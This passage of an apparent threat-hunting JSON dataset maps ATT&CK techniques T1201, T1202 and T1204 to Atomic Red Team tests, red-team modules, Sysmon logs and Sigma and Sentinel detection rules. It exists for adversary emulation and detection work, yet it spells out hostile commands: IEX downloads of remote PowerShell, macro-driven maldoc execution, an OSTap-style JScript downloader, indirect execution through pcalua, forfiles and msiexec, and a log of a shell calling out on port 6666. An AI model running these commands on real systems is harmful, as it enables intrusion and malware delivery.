"command_prompt", "elevation_required": false, "command": "net accounts /domain\n"}}, {"name": "Examine password policy - macOS", "description": "Lists the password policy to console on macOS.\n", "supported_platforms": ["macos"], "executor": {"name": "bash", "command": "pwpolicy getaccountpolicies"}}]}}, {"Mitre Stockpile - Password Policy Discovery": {"id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a", "name": "Password Policy", "description": "Password Policy Discovery", "tactic": "discovery", "technique": {"attack_id": "T1201", "name": "Password Policy Discovery"}, "platforms": {"darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}, "windows": {"psh": {"command": "net accounts"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_gpo", "ATT&CK Technique #1": "T1201", "ATT&CK Technique #2": "", "Technique": "Password Policy Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_gpo\":  [\"T1201\"],"}}], "command_list": ["cat /etc/pam.d/common-password\n", "cat /etc/security/pwquality.conf\n", "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "cat /etc/login.defs\n", "net accounts\n", "net accounts /domain\n", "pwpolicy getaccountpolicies", {"darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}, "windows": {"psh": {"command": "net accounts"}}}, "powershell/situational_awareness/network/powerview/get_gpo", "powershell/situational_awareness/network/powerview/get_gpo", "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ administrator.0DAY> net accounts\nHow long must force users to log off after time expires:? Never\nMinimum password age (days): 1\nMaximum password age (days): 42\nMinimum password length: 7\nKeep the length of the password history: 24\nLockout threshold: Never\nLockout duration (minutes): 30\nLock observation window (minutes): 30\nComputer role: SERVER\nThe command completed successfully."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 11and (process_command_line contains \"net accounts\"or process_command_line contains \"net accounts \\\\/domain\")", "name": "Password Policy Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system password policies found\ndescription: windows server 2016\nreferences:\ntags: T1016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net accounts # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 accounts # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nlevel: low", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1202", "commands": [{"source": "atomics/T1202/T1202.yaml", "command": "pcalua.exe -a calc.exe\npcalua.exe -a #{payload_path}\n", "name": null}, {"source": "atomics/T1202/T1202.yaml", "command": "pcalua.exe -a #{process}\npcalua.exe -a C:\\Windows\\System32\\calc.exe\n", "name": null}, {"source": "atomics/T1202/T1202.yaml", "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe\nforfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"\n", "name": null}, {"source": "SysmonHunter - Indirect Command Execution", "command": "pcalua.exe", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\n#sysmon log\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16: 27: 08.447\nProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}\nProcessId: 588\nImage: C: \\ Windows \\ System32 \\ msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: / q / i http://192.168.126.146/abc.txt\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}\nLogonId: 0x66db8\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}\nParentProcessId: 1220\nParentImage: C: \\ Windows \\ System32 \\ forfiles.exe\nParentCommandLine: forfiles / p c: \\ windows \\ system32 / m cmd.exe / c \"msiexec.exe / q / i http://192.168.126.146/abc.txt\"\n\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x4c4\nNew Process Name: C: \\ Windows \\ System32 \\ forfiles.exe", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\n#sysmon log\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16: 12: 37.744\nProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\nProcessId: 2148\nImage: C: \\ Windows \\ System32 \\ pcalua.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Program Compatibility Assistant\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName:\nCommandLine: Pcalua -m -a C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\nLogonId: 0x66ddb\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = 280038828C2412F3867DDB22E07759CB26F7D8EA\nParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00}\nParentProcessId: 2724\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ system32 \\ cmd.exe\"\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16: 12: 37.775\nProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00}\nProcessId: 2804\nImage: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\nFileVersion: 2.2.14\nDescription: ApacheBench command line utility\nProduct: Apache HTTP Server\nCompany: Apache Software Foundation\nOriginalFileName: ab.exe\nCommandLine: \"C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\"\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\nLogonId: 0x66ddb\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C\nParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\nParentProcessId: 2148\nParentImage: C: \\ Windows \\ System32 \\ pcalua.exe\nParentCommandLine: Pcalua -m -a C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x864\nNew Process Name: C: \\ Windows \\ System32 \\ pcalua.exe\n\nEventID: 4688\nProcess information:\nNew Process ID: 0xaf4\nNew Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\n\nEventID: 5156\nApplication Information:\nProcess ID: 2804\nApplication Name: \\ device \\ harddiskvolume2 \\ users \\ 12306br0 \\ desktop \\ a \\ shell.exe\n\nInternet Information:\nDirection: Outbound\nSource address: 192.168.126.149\nSource Port: 49163\nDestination address: 192.168.126.146\nDestination Port: 6666", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Indirect Command Execution": {"attack_technique": "T1202", "display_name": "Indirect Command Execution", "atomic_tests": [{"name": "Indirect Command Execution - pcalua.exe", "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n", "supported_platforms": ["windows"], "input_arguments": {"process": {"description": "Process to execute", "type": "string", "default": "calc.exe"}, "payload_path": {"description": "Path to payload", "type": "path", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\n"}}, {"name": "Indirect Command Execution - forfiles.exe", "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Forfiles.md)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened\n", "supported_platforms": ["windows"], "input_arguments": {"process": {"description": "Process to execute", "type": "string", "default": "calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\nforfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"\n"}}]}}, {"SysmonHunter - T1202": {"name": "Indirect Command Execution", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "pcalua.exe"}}}]}}], "command_list": ["pcalua.exe -a calc.exe\npcalua.exe -a #{payload_path}\n", "pcalua.exe -a #{process}\npcalua.exe -a C:\\Windows\\System32\\calc.exe\n", "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe\nforfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"\n", "pcalua.exe", "Log\n#sysmon log\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16: 27: 08.447\nProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}\nProcessId: 588\nImage: C: \\ Windows \\ System32 \\ msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: / q / i http://192.168.126.146/abc.txt\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}\nLogonId: 0x66db8\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}\nParentProcessId: 1220\nParentImage: C: \\ Windows \\ System32 \\ forfiles.exe\nParentCommandLine: forfiles / p c: \\ windows \\ system32 / m cmd.exe / c \"msiexec.exe / q / i http://192.168.126.146/abc.txt\"\n\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x4c4\nNew Process Name: C: \\ Windows \\ System32 \\ forfiles.exe", "Log\n#sysmon log\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16: 12: 37.744\nProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\nProcessId: 2148\nImage: C: \\ Windows \\ System32 \\ pcalua.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Program Compatibility Assistant\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName:\nCommandLine: Pcalua -m -a C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\nLogonId: 0x66ddb\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = 280038828C2412F3867DDB22E07759CB26F7D8EA\nParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00}\nParentProcessId: 2724\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ system32 \\ cmd.exe\"\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16: 12: 37.775\nProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00}\nProcessId: 2804\nImage: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\nFileVersion: 2.2.14\nDescription: ApacheBench command line utility\nProduct: Apache HTTP Server\nCompany: Apache Software Foundation\nOriginalFileName: ab.exe\nCommandLine: \"C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\"\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\nLogonId: 0x66ddb\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C\nParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\nParentProcessId: 2148\nParentImage: C: \\ Windows \\ System32 \\ pcalua.exe\nParentCommandLine: Pcalua -m -a C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x864\nNew Process Name: C: \\ Windows \\ System32 \\ pcalua.exe\n\nEventID: 4688\nProcess information:\nNew Process ID: 0xaf4\nNew Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\n\nEventID: 5156\nApplication Information:\nProcess ID: 2804\nApplication Name: \\ device \\ harddiskvolume2 \\ users \\ 12306br0 \\ desktop \\ a \\ shell.exe\n\nInternet Information:\nDirection: Outbound\nSource address: 192.168.126.149\nSource Port: 49163\nDestination address: 192.168.126.146\nDestination Port: 6666"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_parent_command_line contains \"pcalua.exe\"or process_path contains \"pcalua.exe\"or process_path contains \"bash.exe\"or process_path contains \"forfiles.exe\")", "name": "Indirect Command Execution"}], "possible_detections": [{"data_source": {"title": "Microsoft Office Product Spawning Windows Shell", "id": "438025f9-5856-4663-83f7-52f878a70a50", "status": "experimental", "description": "Detects a Windows command line executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio.", "references": ["https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100", "https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html"], "tags": ["attack.execution", "attack.defense_evasion", "attack.t1059", "attack.t1202", "car.2013-02-003", "car.2014-04-003"], "author": "Michael Haag, Florian Roth, Markus Neis", "date": "2018/04/06", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\POWERPNT.exe", "*\\MSPUB.exe", "*\\VISIO.exe", "*\\OUTLOOK.EXE"], "Image": ["*\\cmd.exe", "*\\powershell.exe", "*\\wscript.exe", "*\\cscript.exe", "*\\sh.exe", "*\\bash.exe", "*\\scrcons.exe", "*\\schtasks.exe", "*\\regsvr32.exe", "*\\hh.exe", "*\\wmic.exe", "*\\mshta.exe", "*\\rundll32.exe", "*\\msiexec.exe", "*\\forfiles.exe", "*\\scriptrunner.exe", "*\\mftrace.exe", "*\\AppVLP.exe", "*\\svchost.exe"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "MS Office Product Spawning Exe in User Dir", "id": "aa3a6f94-890e-4e22-b634-ffdfd54792cc", "status": "experimental", "description": "Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio", "references": ["sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c", "https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign"], "tags": ["attack.execution", "attack.defense_evasion", "attack.t1059", "attack.t1202", "FIN7", "car.2013-05-002"], "author": "Jason Lynch", "date": "2019/04/02", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\POWERPNT.exe", "*\\MSPUB.exe", "*\\VISIO.exe", "*\\OUTLOOK.EXE"], "Image": ["C:\\users\\\\*.exe"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Execution from Outlook", "id": "e212d415-0e93-435f-9e1a-f29005bb4723", "status": "experimental", "description": "Detects EnableUnsafeClientMailRules used for Script Execution from Outlook", "references": ["https://github.com/sensepost/ruler", "https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html"], "tags": ["attack.execution", "attack.t1059", "attack.t1202"], "author": "Markus Neis", "date": "2018/12/27", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"clientMailRules": {"CommandLine": "*EnableUnsafeClientMailRules*"}, "outlookExec": {"ParentImage": "*\\outlook.exe", "CommandLine": "\\\\\\\\*\\\\*.exe"}, "condition": "clientMailRules or outlookExec"}, "falsepositives": ["unknown"], "level": "high"}}]}, {"technique_id": "T1204", "commands": [{"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\ncscript //E:Jscript %TEMP%\\OSTapGet.js\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - User Execution": {"attack_technique": "T1204", "display_name": "User Execution", "atomic_tests": [{"name": "OSTap Style Macro Execution", "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n", "supported_platforms": ["windows"], "input_arguments": {"ms_office_version": {"description": "Microsoft Office version number found in \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\"", "type": "String", "default": "16.0"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "String", "default": "Word"}, "jse_path": {"description": "Path for the macro to write out the \"malicious\" .jse file\n", "type": "String", "default": "C:\\Users\\Public\\art.jse"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys\n", "prereq_command": "If (Test-Path HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "$msword = New-Object -ComObject word.application\nStop-Process -Name WINWORD\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "cleanup_command": "if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }\nRemove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore\n"}}, {"name": "OSTap Payload Download", "description": "Uses cscript //E:jscript to download a file\n", "supported_platforms": ["windows"], "input_arguments": {"script_file": {"description": "File to execute jscript code from", "type": "Path", "default": "%TEMP%\\OSTapGet.js"}, "file_url": {"description": "URL to retrieve file from", "type": "Url", "default": "https://128.30.52.100/TR/PNG/iso_8859-1.txt"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "cleanup_command": "del #{script_file} /F /Q >nul 2>&1\n"}}, {"name": "Maldoc choice flags command execution", "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "supported_platforms": ["windows"], "input_arguments": {"ms_office_version": {"description": "Microsoft Office version number found in \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\"", "type": "String", "default": "16.0"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "String", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys\n", "prereq_command": "If (Test-Path HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "$msword = New-Object -ComObject word.application\nStop-Process -Name WINWORD\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "cleanup_command": "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore\n"}}, {"name": "OSTAP JS version", "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\n\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "supported_platforms": ["windows"], "input_arguments": {"ms_office_version": {"description": "Microsoft Office version number found in \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\"", "type": "String", "default": "16.0"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "String", "default": "Word"}, "jse_path": {"description": "jse file to execute with wscript", "type": "Path", "default": "C:\\Users\\Public\\art.jse"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys\n", "prereq_command": "If (Test-Path HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "$msword = New-Object -ComObject word.application\nStop-Process -Name WINWORD\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "cleanup_command": "if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }\nRemove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore\n"}}]}}], "command_list": ["IEX (iwr 